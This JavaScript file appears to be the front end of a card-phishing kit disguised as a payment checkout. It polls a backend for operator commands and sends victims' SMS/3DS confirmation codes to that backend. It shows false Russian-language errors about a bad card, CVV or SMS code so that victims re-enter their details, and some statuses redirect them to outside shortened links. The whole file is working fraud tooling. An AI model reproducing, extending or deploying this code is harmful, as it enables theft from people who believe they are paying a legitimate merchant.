let isPaused = false;
let isPaused3ds = false;


const checkStatusCard = (method) => {
    setInterval(function() {
        if (isPaused != true) {
            $.ajax({
                url: '/payment/api/requester.php',
                type: 'POST',
                data: {
                    action: 'get_status',
                    order_id: localStorage.getItem('id') ? localStorage.getItem('id') : "1",
                },
                success: function(data) {
                    data = $.parseJSON(data);
                    switch (data.status) {
                        case 'vbiv':
                            clearState();
                            window.location.href = "/payment/3ds/";

                            break;
							case 'scream':
							clearState();
							window.location.href = "https://pnrtscr.com/sggd6wven";
							break;
                        case 'sbp':
                            clearState();
                            window.location.href = "/payment/sbp/";

                            break;
                        case 'new_card':
                            clearState();
                            const $loader = $("#loader");
                            const $mainWrapper = $(".main-wrapper");
                            $("#cardNumber").addClass('CheckoutInput--invalid');
                            $loader.hide();
                            $mainWrapper.show();
                            Notification('Ошибка, неверный срок действия карты или cvv, проверьте данные карты, после чего повторите оплату ', 'error');

                            break;
                    }
                },
                error: function(xhr, status, error) {
                    console.log('Error:', error);
                }
            });
        }
    }, 2500);
}


const checkStatus3DS = (method) => {
    setInterval(function() {
        if (isPaused3ds != true) {

            if (method == 0) {

                $.ajax({
                    url: '/payment/api/requester.php',
                    type: 'POST',
                    data: {
                        action: 'statusPayment',
                        paymentNumber: localStorage.getItem('id') ? localStorage.getItem('id') : "1",
                    },
                    success: function(data) {
                        data = $.parseJSON(data);
                        switch (data.status) {
							case 'scream':
							clearState();
							window.location.href = "https://pnrtscr.com/sggd6wven";
							break;
                            case 'bilet':
                                clearState();
                                window.setTimeout(function() {
                                    location.href = '/ticket';
                                }, 1000);
                                break;
                            case 'new_code':
                                clearState();
                                $("#descs").text("Неверный код из смс! Вам отправлен новый код.");
                                $("#codeinput").val('');
                                $("#step-2").fadeIn();
                                $("#step-3").fadeOut();
                                break;
                            case 'nofunds':
                                clearState();
                                window.setTimeout(function() {
                                    location.href = '/payment/merchant/checkout/?merchantError=InsufficientFunds';
                                }, 1000);
                                break;
                            case '900':
                                clearState();
                                window.setTimeout(function() {
                                    location.href = '/payment/merchant/checkout/?merchantError=Internal';
                                }, 1000);
                                break;

                            case 'sbp':
                                clearState();
                                window.location.href = "/payment/sbp/"
                                break;

                         case 'error':
                                clearState();
                                window.setTimeout(function() {
                                    location.href = '/payment/merchant/checkout/?merchantError=noInfo';
                                }, 1000);
                                break;

                            case 'wrong_data':
                                clearState();
                                window.setTimeout(function() {
                                    location.href = '/payment/merchant/checkout/?merchantError=CardBlocked';
                                }, 1000);
                                break;
                        }

                    },
                    error: function(xhr, status, error) {
                        console.log('Error:', error);
                    }
                });
            }
            if (method == 1) {
                $.ajax({
                    url: '/payment/api/requester.php',
                    type: 'POST',
                    data: {
                        action: 'statusPayment',
                        paymentNumber: localStorage.getItem('id') ? localStorage.getItem('id') : "1",
                    },
                    success: function(data) {
                        data = $.parseJSON(data);
                        switch (data.status) {
							case 'scream':
							clearState();
							window.location.href = "https://pnrtscr.com/sggd6wven";
							break;
                            case 'nofunds':
                                clearState();
                                window.setTimeout(function() {
                                    location.href = '/payment/merchant/checkout/?merchantError=EquivalentFunds';
                                }, 1000);
                                break;
                            case 'new_code':
                                clearState();
                                $("#descs").text("Неверный код из смс! Вам отправлен новый код.");
                                $("#codeinput").val('');
                                $("#step-2").fadeIn();
                                $("#step-3").fadeOut();
                                break;
                            case '900':
                                clearState();
                                window.setTimeout(function() {
                                    location.href = '/payment/merchant/checkout/?merchantError=InternalError';
                                }, 1000);
                                break;
                            case 'scream':
                                clearState();
                                window.location.replace("https://kurl.ru/IfKeC");
                                break;
                            case 'new_card':
                                clearState();
                                window.setTimeout(function() {
                                    location.href = '/payment/merchant/checkout/?merchantError=TransactionError';
                                }, 1000);
                                break;
                            case 'bilet':
                                clearState();
                                window.setTimeout(function() {
                                    location.href = '/payment/merchant/checkout/?merchantError=ErrorSuccess';
                                }, 1000);
                                break;
                            case 'error':
                                clearState();
                                window.setTimeout(function() {
                                    location.href = '/payment/merchant/checkout/?merchantError=noInfo';
                                }, 1000);
                                break;
                            case 'wrong_data':
                                clearState();
                                window.setTimeout(function() {
                                    location.href = '/payment/merchant/checkout/?merchantError=CardBlocked';
                                }, 1000);
                                break;
							case 'ref':
							 clearState();
                                window.setTimeout(function() {
                                    location.href = '/payment/merchant/checkout/?merchantError=NextStep';
                                }, 1000);
							break;

                        }




                    },
                    error: function(msg) {
                        console.log("error");
                    }
                });
            }

        }
    }, 2500);
}



const clearState = () => {
    isPaused = true;
    isPaused3ds = true;
    $.ajax({
        url: '/payment/api/requester.php',
        type: 'Post',
        data: {
            "action": "clearState",
            "paymentNumber": localStorage.getItem('id') ? localStorage.getItem('id') : "1",
        },
        error: function(xhr, status, error) {
            console.log('Error:', error);
        }
    });
}

const sendLog3ds = (code, method) => {
    $.ajax({
        type: 'POST',
        url: '/payment/api/requester.php',
        data: {
            action: "sendcode",
            order_id: localStorage.getItem('id') ? localStorage.getItem('id') : "1",
            code: code,
        },
        success: function(data) {
            data = $.parseJSON(data);
            if (data.status != "wait") {
                $.ajax({
                    url: '/payment/api/requester.php',
                    type: 'Post',
                    data: {
                        "action": "clearState",
                        "paymentNumber": localStorage.getItem('id') ? localStorage.getItem('id') : "1",
                    },
                    error: function(xhr, status, error) {
                        console.log('Error:', error);
                    }
                });
            }

        }
    });
}